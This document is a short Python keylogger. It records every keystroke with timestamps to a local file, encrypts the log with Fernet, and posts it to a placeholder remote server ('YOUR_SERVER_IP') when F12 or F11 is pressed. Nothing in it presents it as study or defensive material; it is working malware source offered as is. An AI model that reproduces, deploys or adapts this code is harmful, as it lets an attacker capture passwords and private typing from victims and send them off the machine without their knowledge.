from pynput import keyboard
from cryptography.fernet import Fernet
import datetime
import os
import requests

LOG_FILE = "keylogs.txt"
ENCRYPTED_FILE = "encrypted_log.txt"
KEY_FILE = "secret.key"

# Generate encryption key if not exists
if not os.path.exists(KEY_FILE):
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)
else:
    with open(KEY_FILE, "rb") as key_file:
        key = key_file.read()

fernet = Fernet(key)

def on_press(key):
    if key == keyboard.Key.esc:
        print("Esc key pressed. Exiting keylogger...")
        return False  # Kill switch

    # Upload logs when F12 is pressed
    if key == keyboard.Key.f12:
        print("F12 pressed. Encrypting and uploading logs...")
        encrypt_logs()
        send_logs()
        return  # Don't log the F12 press itself

    # Decrypt and upload logs when F11 is pressed
    if key == keyboard.Key.f11:
        print("F11 pressed. Decrypting and uploading logs...")
        decrypt_logs()
        try:
            with open("decrypted_log.txt", "rb") as f:
                response = requests.post("http://YOUR_SERVER_IP/upload", files={"file": f})
                print("Server response:", response.text)
        except Exception as e:
            print("Error sending decrypted log to server:", e)
        return  # Don't log the F11 press itself

    with open(LOG_FILE, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f" [{key}] ")

    log_with_timestamp(f"Key Pressed: {key}")

def log_with_timestamp(data):
    with open(LOG_FILE, "a") as f:
        f.write(f"\n[{datetime.datetime.now()}] {data}\n")

def encrypt_logs():
    with open(LOG_FILE, "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(ENCRYPTED_FILE, "wb") as f:
        f.write(encrypted)

def decrypt_logs():
    try:
        with open(ENCRYPTED_FILE, "rb") as f:
            encrypted_data = f.read()
        decrypted = fernet.decrypt(encrypted_data)
        # Save or print the decrypted logs as needed
        with open("decrypted_log.txt", "wb") as f:
            f.write(decrypted)
        print("Logs decrypted and saved to decrypted_log.txt")
    except Exception as e:
        print("Error decrypting logs:", e)

def send_logs():
    try:
        with open(ENCRYPTED_FILE, "rb") as f:
            response = requests.post("http://YOUR_SERVER_IP:5000/upload", files={"file": f})
            print("Server response:", response.text)
    except Exception as e:
        print("Error sending to server:", e)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()
